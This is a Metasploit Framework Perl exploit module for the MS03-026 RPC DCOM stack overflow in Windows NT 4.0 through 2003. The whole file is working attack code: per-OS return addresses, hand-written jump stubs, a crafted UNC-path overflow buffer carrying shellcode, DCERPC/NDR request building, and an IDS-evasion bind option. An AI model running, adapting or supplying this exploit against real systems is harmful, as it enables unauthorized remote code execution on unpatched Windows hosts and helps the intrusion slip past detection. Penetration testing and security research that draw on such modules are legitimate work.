
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::msrpc_dcom_ms03_026;
use strict;
use base "Msf::Exploit";
use Pex::DCERPC;
use Pex::NDR;
use Pex::Text;
use Pex::x86;

my $advanced = {
    'FragSize'    => [ 256, 'The DCERPC fragment size' ],
    'BindEvasion' => [ 0,   'IDS Evasion of the Bind request' ],
};

my $info = {
    'Name'    => 'Microsoft RPC DCOM MSO3-026',
    'Version' => '$Rev$',
    'Authors' => [
        'H D Moore <hdm [at] metasploit.com>',
        'spoonm <ninjatools [at] hush.com>',
        'Brian Caswell <bmc [at] shmoo.com>'
    ],

    'Arch' => ['x86'],
    'OS'   => [ 'win32', 'win2000', 'winnt', 'winxp', 'win2003' ],
    'Priv' => 1,

    'AutoOpts' => { 'EXITFUNC' => 'thread' },
    'UserOpts' => {
        'RHOST' => [ 1, 'ADDR', 'The target address' ],
        'RPORT' => [ 1, 'PORT', 'The target port', 135 ],
    },

    'Payload' => {
        'Space'    => 880,
        'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
        'Keys'     => ['+ws2ord'],
    },

    'Description' => Pex::Text::Freeform(
        qq{
        This module exploits a stack overflow in the RPCSS service, this vulnerability
        was originally found by the Last Stage of Delirium research group and has been
        widely exploited ever since. This module can exploit the English versions of 
        Windows NT 4.0 SP3-6a, Windows 2000, Windows XP, and Windows 2003 all in one request :)
}
    ),

    'Refs' => [ [ 'OSVDB', '2100' ], [ 'MSB', 'MS03-026' ], [ 'MIL', '42' ], ],

    'DefaultTarget' => 0,
    'Targets'       => [
        [
            'Windows NT SP3-6a/2K/XP/2K3 English ALL',
            0x77f33723,    # Windows NT 4.0 SP6a (esp)
            0x7ffde0eb,    # Windows 2000 writable address + jmp+0xe0
            0x0018759f,    # Windows 2000 Universal (ebx)
            0x01001c59,    # Windows XP SP0/SP1 (pop pop ret)
            0x001b0b0b
            , # Windows 2003 call near [ebp+0x30] (unicode.nls - thanks Litchfield!)
            0x776a240d,    # Windows NT 4.0 SP5 (eax) ws2help.dll
            0x74ff16f3,    # Windows NT 4.0 SP3/4 (pop pop ret) rnr20.dll
        ],
    ],

    'Keys' => ['dcom'],

    'DisclosureDate' => 'Jul 16 2003',
};

sub new {
    my $class = shift;
    my $self  =
      $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
    return ($self);
}

sub Build {
    my ($self)     = @_;
    my $target_idx = $self->GetVar('TARGET');
    my $shellcode  = $self->GetVar('EncodedPayload')->Payload;
    my $target     = $self->Targets->[$target_idx];

    if ( !$self->InitNops(128) ) {
        $self->PrintLine("[*] Failed to initialize the nop module.");
        return;
    }

    ##
    # The following was inspired by Dino Dai Zovi's description of his exploit
    ##

    # 360 is a magic number for cross-OS exploitation :)
    my $xpseh = Pex::Text::EnglishText(360);

    # Jump to [esp-4] - (distance to shellcode)
    my $jmpsc = "\x8b\x44\x24\xfc" .    # mov eax,[esp-0x4]
      "\x05\xe0\xfa\xff\xff" .          # add eax,0xfffffae0 (sub eax, 1312)
      "\xff\xe0";                       # jmp eax

    # Jump to [ebp+0x30] - (distance to shellcode) - thanks again Litchfield!
    my $jmpsc2k3 = "\x8b\x45\x30" .     # mov eax,[ebp+0x30]
      "\x05\x24\xfb\xff\xff" .          # add eax,0xfffffb24 (sub 1244)
      "\xff\xe0";                       # jmp eax

    # Windows 2003 added by spoonm
    substr( $xpseh, 246 - length($jmpsc2k3), length($jmpsc2k3), $jmpsc2k3 );
    substr( $xpseh, 246, 2,
        Pex::x86::JmpShort( '$+' . ( -1 * length($jmpsc2k3) ) ) );
    substr( $xpseh, 250, 4, pack( 'V', $target->[5] ) );

    substr( $xpseh, 306, 2,              "\xeb\x06" );
    substr( $xpseh, 310, 4,              pack( 'V', $target->[4] ) );
    substr( $xpseh, 314, length($jmpsc), $jmpsc );

    ##
    # NT 4.0 SP3/SP4 work the same, just use a pop/pop/ret that works on both
    # NT 4.0 SP5 is a jmp eax to avoid a conflict with SP3/SP4
    # HD wrote NT 4.0 SP6a, and it's off in a different place
    #
    # Our NT 4.0 SP3/SP4/SP5 overwrites will look something like this:
    # (hopefully I'm accurate, this is from my memory...)
    #
    # |---pop pop ret--------        --eax---|
    # V                     |        |       V
    # [ jmp +17 ] [ ret sp3/4 ] [ ret sp5 ] [ jmpback sp5 ] [ jmpback sp3/4 ]
    #     4             4           4              5               5
    #     |                                                 ^
    #     --------------------------------------------------|
    # The jmpback's all are 5 byte backwards jumps into our shellcode that
    # sits just below these overwrites...
    ##

    my $nt4sp3jmp =
        Pex::x86::JmpShort( '$+' . ( 12 + 5 ) )
      . Pex::Text::RandomChars( 2, $self->PayloadBadChars );

    my $nt4sp5jmpback = "\xe9" . pack( 'V', -( 5 + 4 + length($shellcode) ) );
    my $nt4sp3jmpback =
      "\xe9" . pack( 'V', -( 12 + 5 + 5 + length($shellcode) ) );
    my $ntshiz = $nt4sp3jmp
      . pack( 'V', $target->[7] )
      . pack( 'V', $target->[6] )
      . $nt4sp5jmpback
      . $nt4sp3jmpback;

    # Pad to the magic value of 118 bytes
    $ntshiz .=
      Pex::Text::RandomChars( 118 - length($ntshiz), $self->PayloadBadChars );

    # Create the evil UNC path used in the overflow
    my $uncpath =
        "\x5c\x00\x5c\x00"
      . $self->MakeNops(32)
      . "\xeb\x10\xeb\x19"
      .    # When attacking NT 4.0, jump over 2000/XP return
      pack( "V", $target->[3] ) .  # Return address for 2000 (ebx)
      pack( "V", $target->[1] ) .  # Return address for NT 4.0 (esi)
      pack( "V", $target->[2] ) .  # Writable address on 2000 and jmp for NT 4.0
      $self->MakeNops(88)
      . "\xeb\x04\xff\xff\xff\xff"
      . $self->MakeNops(8)
      . "\xeb\x04\xeb\x04"
      . $self->MakeNops(4)
      . "\xeb\x04\xff\xff\xff\xff"
      . $shellcode
      . $ntshiz
      . $xpseh
      . "\x5c\x00\x41\x00\x00\x00\x00\x00\x00\x00";

    # This is the rpc cruft needed to trigger the vuln API
    my $stub =
        Pex::NDR::Short(5)
      . Pex::NDR::Short(1)
      . Pex::NDR::Long(0)
      . Pex::NDR::Long(0)
      . Pex::Text::RandomData(16)
      .    # UUID
      Pex::NDR::Long(0)
      . Pex::NDR::Long(0)
      . Pex::NDR::Long(0)
      . Pex::NDR::Long(0)
      . Pex::NDR::Long(0)
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::UnicodeConformantVaryingStringPreBuilt($uncpath)
      .

      Pex::NDR::Long(0)
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long(1)
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long(1)
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) )
      . Pex::NDR::Long(1)
      . Pex::NDR::Long(1)
      . Pex::NDR::Long( int( rand(0xFFFFFFFF) ) );

    return $stub;
}

sub Exploit {
    my $self        = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');

    my $uuid    = '4d9f4ab8-7d1c-11cf-861e-0020af6e7c57';
    my $version = '0.0';
    my $handle  =
      Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_ip_tcp', $target_host,
        $target_port );

    my $dce = Pex::DCERPC->new(
        'handle'      => $handle,
        'fragsize'    => $self->GetVar('FragSize'),
        'bindevasion' => $self->GetVar('BindEvasion'),
    );

    if ( !$dce ) {
        $self->PrintLine("[*] Could not bind to $handle");
        return;
    }

    my $stub = $self->Build();

    if ( !$stub ) {
        $self->PrintLine('[*] unable to create request');
    }

    $self->PrintLine('[*] Sending request...');

    my @response = $dce->request( $handle, 0, $stub );
    if (@response) {
        $self->PrintLine('[*] RPC server responded with:');
        foreach my $line (@response) {
            $self->PrintLine( '[*] ' . $line );
        }
        $self->PrintLine('[*] This probably means that the system is patched');
    }

    return;
}
